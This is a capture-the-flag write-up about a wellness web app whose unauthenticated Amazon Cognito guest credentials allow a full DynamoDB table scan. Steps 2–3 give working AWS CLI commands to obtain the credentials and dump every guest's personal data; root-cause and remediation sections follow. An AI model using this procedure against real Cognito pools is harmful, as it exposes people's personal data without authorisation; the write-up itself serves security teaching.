# Byte Lotus Wellness — CTF Writeup

**Category:** ☁️ #Cloud
**Difficulty:** Easy
**Points:** 60

## Challenge Summary
_Flags have been omitted from this writeup per platform guidelines._


Byte Lotus Wellness is a "free" wellness dashboard app that requires no login. It silently issues AWS credentials to every visitor via an Amazon Cognito Identity Pool and uses those credentials to query a DynamoDB table directly from the browser. The unauthenticated IAM role backing this flow was over-permissioned, allowing a full table scan instead of restricting access to a caller's own record.

**Target:**
`http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/`

**Goal:** Identify the mechanism issuing AWS credentials, abuse it to read data beyond the current guest's own record, and recover the flag hidden in another guest's profile.

---

## Step 1 — Recon

Loading the target page returns a static site hosted on S3 (`Server: AmazonS3`). The page pulls in:

- `aws-sdk-2.1500.0.min.js` — the AWS JavaScript SDK
- `app.js` — the app's own client-side logic

Reviewing `app.js` reveals the entire trust model in a code comment:

```js
// No login screen on purpose: every visitor gets "free" AWS guest
// credentials from our Cognito Identity Pool so we can save wellness
// preferences without the friction of an account.
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";
```

The app:
1. Configures `AWS.CognitoIdentityCredentials` with the pool ID (no auth provider — unauthenticated flow).
2. Generates or reuses a random `guest-XXXXXXXX` ID stored in `localStorage`.
3. Calls `dynamodb.getItem()` directly from the browser using the temporary Cognito-issued credentials, keyed on that guest ID.

This confirms the mechanism "quietly handing out access" (per @0xMia's tip) is a **Cognito Identity Pool configured for unauthenticated (guest) identities**, paired with an IAM role attached to that pool.

---

## Step 2 — Obtain the Guest AWS Credentials

Using the AWS CLI, the same unauthenticated flow the browser uses can be reproduced manually.

**Get a Cognito Identity ID from the pool:**

```bash
IDENTITY_ID=$(aws cognito-identity get-id \
  --identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688 \
  --region us-east-1 \
  --query 'IdentityId' --output text)
```

**Exchange the Identity ID for real temporary AWS credentials:**

```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id $IDENTITY_ID \
  --region us-east-1
```

This returns a standard STS-style credential set:

```json
{
  "Credentials": {
    "AccessKeyId": "ASIA...",
    "SecretKey": "...",
    "SessionToken": "...",
    "Expiration": "..."
  }
}
```

**Export and verify the assumed role:**

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

aws sts get-caller-identity
```

```json
{
  "UserId": "AROAU2VYTBGYCEB4JME2S:CognitoIdentityCredentials",
  "Account": "332173347248",
  "Arn": "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
}
```

This confirms the credentials are real, live AWS access under the role `complimentary-cognito-unauth-role` — handed out to literally anyone who visits the page, no login or API key required.

---

## Step 3 — Escalate from "Read My Own Record" to "Read Everyone's Record"

The web app only ever calls `dynamodb:GetItem` scoped to the visitor's own `guest_id`. However, the *IAM policy* attached to the unauth role was never actually restricted to that single action/pattern — a common misconfiguration where developers only test the one code path the app uses and leave the underlying role permissions much broader (e.g. `dynamodb:*` or `Scan`/`Query` at the table level, with no `dynamodb:LeadingKeys` condition tying access to the caller's own Cognito identity).

Testing this directly:

```bash
aws dynamodb scan \
  --table-name complimentary-GuestWellnessProfiles \
  --region us-east-1
```

**Result: success.** The unauthenticated guest role was permitted to `Scan` the entire table, dumping every guest's record — names, emails, phone numbers, plaintext passwords, and GPS coordinates — not just the caller's own.

---

## Step 4 — Recover the Flag

Among the dumped records was `guest-vip-042`:

```json
{
  "password": {"S": "escalation_only"},
  "location": {"S": "25.2048,55.2708"},
  "notes": {"S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. [flag omitted]"},
  "guest_id": {"S": "guest-vip-042"},
  "email": {"S": "vip042@hackerholidays.thm"},
  "phone": {"S": "+1-555-0100"},
  "name": {"S": "Guest VIP-042"}
}
```

**Flag:** `[flag omitted]`

---

## Root Cause

| Layer | Issue |
|---|---|
| **Cognito Identity Pool** | Allows unauthenticated ("guest") identities by design, handing real AWS credentials to any anonymous visitor. |
| **IAM Role Policy** | `complimentary-cognito-unauth-role` grants `dynamodb:Scan` (and likely more) on the entire table, with no per-identity restriction. |
| **Missing Control** | No `dynamodb:LeadingKeys` condition binding `guest_id` to `${cognito-identity.amazonaws.com:sub}`, which would have scoped access to a caller's own item only. |
| **Client-side trust** | The app's front-end logic (only calling `GetItem` on your own ID) was the *only* thing enforcing "you can only see your own data" — trivially bypassed by calling the API directly with the same credentials. |

This is a textbook example of **"friendly frontend, permissive backend"**: the UI never lets you do anything malicious, but the actual IAM policy behind it does.

---

## Remediation

1. **Scope IAM policy with fine-grained access control**, e.g.:
   ```json
   {
     "Effect": "Allow",
     "Action": ["dynamodb:GetItem"],
     "Resource": "arn:aws:dynamodb:us-east-1:332173347248:table/complimentary-GuestWellnessProfiles",
     "Condition": {
       "ForAllValues:StringEquals": {
         "dynamodb:LeadingKeys": ["${cognito-identity.amazonaws.com:sub}"]
       }
     }
   }
   ```
2. **Remove `Scan`/`Query`** from the unauthenticated role entirely — the app only ever needs `GetItem` on a single key.
3. **Never store plaintext passwords** in a table reachable by client-side credentials (or at all).
4. **Avoid unauthenticated Cognito identities** for anything touching PII; if guest access is required, apply least privilege rigorously and assume every unauth credential will be extracted and used directly against the AWS API, bypassing the web app entirely.

---

## Key Takeaway

"No login required" doesn't mean "no access control required" — it means the access control has moved from a login form to an IAM policy, and that policy needs to be audited just as carefully. Client-side JavaScript is not a security boundary; anything the browser can do with issued credentials, an attacker can do directly via the AWS CLI.